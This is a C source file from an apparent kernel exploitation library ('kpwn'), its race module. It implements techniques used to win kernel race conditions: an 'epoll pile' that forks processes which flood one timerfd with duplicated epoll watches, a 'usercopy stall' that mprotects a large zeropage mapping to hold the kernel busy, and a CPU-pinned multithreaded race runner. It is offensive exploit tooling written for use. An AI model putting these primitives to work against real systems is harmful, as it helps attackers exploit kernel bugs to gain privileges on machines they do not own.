#define _GNU_SOURCE

#include <kpwn/logger.h>
#include <kpwn/race.h>
#include <kpwn/utils.h>

#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <unistd.h>

// --- Epoll watch pile --------------------------------------------------------

int kpwn_epoll_pile_init(struct kpwn_epoll_pile *p, size_t n_procs,
                         size_t n_epolls, size_t n_dups) {
  memset(p, 0, sizeof(*p));

  p->timerfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
  p->children = calloc(n_procs, sizeof(pid_t));
  ASSERT(p->children != NULL);
  p->n_children = n_procs;
  p->total_watches = n_procs * n_epolls * n_dups;

  for (size_t i = 0; i < n_procs; i++) {
    pid_t pid = fork();
    if (pid == 0) {
      // Child: create epoll instances, dup timerfd, add to all epolls
      int *epolls = calloc(n_epolls, sizeof(int));
      for (size_t e = 0; e < n_epolls; e++)
        epolls[e] = epoll_create1(0);

      for (size_t d = 0; d < n_dups; d++) {
        int dfd = dup(p->timerfd);
        if (dfd < 0)
          break;
        for (size_t e = 0; e < n_epolls; e++) {
          struct epoll_event ev = {.events = EPOLLIN, .data.fd = dfd};
          epoll_ctl(epolls[e], EPOLL_CTL_ADD, dfd, &ev);
        }
      }

      free(epolls);
      pause();
      _exit(0);
    }
    p->children[i] = pid;
  }

  log_debug("[kpwn:race] epoll pile: %zu procs × %zu epolls × %zu dups = %zu "
            "watches",
            n_procs, n_epolls, n_dups, p->total_watches);
  return 0;
}

int kpwn_epoll_pile_destroy(struct kpwn_epoll_pile *p) {
  for (size_t i = 0; i < p->n_children; i++) {
    if (p->children[i] > 0) {
      kill(p->children[i], SIGKILL);
      waitpid(p->children[i], NULL, 0);
    }
  }
  free(p->children);
  if (p->timerfd >= 0)
    close(p->timerfd);
  memset(p, 0, sizeof(*p));
  log_debug("[kpwn:race] epoll pile destroyed");
  return 0;
}

// --- Usercopy stall ----------------------------------------------------------

int kpwn_usercopy_stall_init(struct kpwn_usercopy_stall *s, size_t len_bytes) {
  s->base = mmap(NULL, len_bytes, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (s->base == MAP_FAILED) {
    log_error("[kpwn:race] stall mmap failed");
    return -1;
  }
  s->len = len_bytes;

  // Touch every page to populate zeropages
  volatile char *p = (volatile char *)s->base;
  for (size_t off = 0; off < len_bytes; off += 0x1000)
    (void)p[off];

  log_debug("[kpwn:race] usercopy stall: %zu MB VMA ready",
            len_bytes / (1024 * 1024));
  return 0;
}

int kpwn_usercopy_stall_trigger(struct kpwn_usercopy_stall *s) {
  // mprotect over the entire zeropage VMA walks all PTEs
  int ret = mprotect(s->base, s->len, PROT_READ);
  log_debug("[kpwn:race] usercopy stall triggered (%zu MB)", s->len >> 20);
  return ret;
}

int kpwn_usercopy_stall_free(struct kpwn_usercopy_stall *s) {
  if (s->base && s->base != MAP_FAILED)
    munmap(s->base, s->len);
  memset(s, 0, sizeof(*s));
  return 0;
}

// --- Simple race runner ------------------------------------------------------

struct race_ctx {
  kpwn_race_fn fn;
  void *arg;
  const struct kpwn_race_opts *opts;
};

static void *race_thread(void *vctx) {
  struct race_ctx *ctx = vctx;
  uint64_t iter = 0;

  while (1) {
    if (ctx->opts->stop && *ctx->opts->stop)
      break;
    if (ctx->opts->max_iter && iter >= ctx->opts->max_iter)
      break;
    ctx->fn(ctx->arg, iter++);
  }
  return NULL;
}

int kpwn_race_run(size_t n_threads, kpwn_race_fn fn, void *arg,
                  const struct kpwn_race_opts *opts) {
  pthread_t *threads = calloc(n_threads, sizeof(pthread_t));
  ASSERT(threads != NULL);

  struct race_ctx ctx = {.fn = fn, .arg = arg, .opts = opts};

  if (opts->cpu >= 0) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(opts->cpu, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
  }

  for (size_t i = 0; i < n_threads; i++)
    pthread_create(&threads[i], NULL, race_thread, &ctx);

  for (size_t i = 0; i < n_threads; i++)
    pthread_join(threads[i], NULL);

  free(threads);
  log_debug("[kpwn:race] race_run done: %zu threads", n_threads);
  return 0;
}
